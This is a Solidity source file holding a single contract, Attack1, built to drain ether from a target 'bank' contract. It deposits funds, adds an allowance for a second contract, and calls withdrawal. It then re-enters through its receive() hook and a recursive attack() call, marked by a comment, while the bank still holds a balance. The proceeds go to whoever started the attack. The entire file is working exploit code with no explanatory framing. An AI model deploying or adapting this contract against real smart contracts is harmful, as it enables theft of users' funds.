//SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.15;

contract Attack1{
    address bank;
    address payable attacker_account;
    address contract2;
    uint256 attack_val;

    constructor(address attackee, address second_contract){
        bank = attackee;
        contract2 = second_contract;
    }

    function sendEther() public {
        (bool success, ) = bank.call{value: attack_val}("");

        require(success, "deposit did not go through");
    }

    function addAllowance() public {
        (bool success, ) = bank.call(
            abi.encodeWithSignature("addAllowance(address,uint256)", contract2, attack_val)
        );

        require(success, "allowance did not go through");
    }

    function receiveEther() public {
        (bool success, ) = bank.call(
            abi.encodeWithSignature("withdrawBalance()")
        );

        require(success, "withdraw did not go through");

        //addition to make attack recursive
        if(bank.balance >= attack_val){
            attack();
        }
    }

    receive() external payable{
        call_contract2();
    }

    function call_contract2() public {
        (bool success, ) = contract2.call(
            abi.encodeWithSignature("transfer(address,uint256)", address(this), attack_val)
        );

        require(success, "calling the second contract did not go through");
    }

    function attack() public {
        sendEther();
        addAllowance();
        receiveEther();

        attacker_account.transfer(address(this).balance);
    }

    function startAttack() public payable {
        attack_val = msg.value;
        attacker_account = payable(msg.sender);

        attack();
    }
}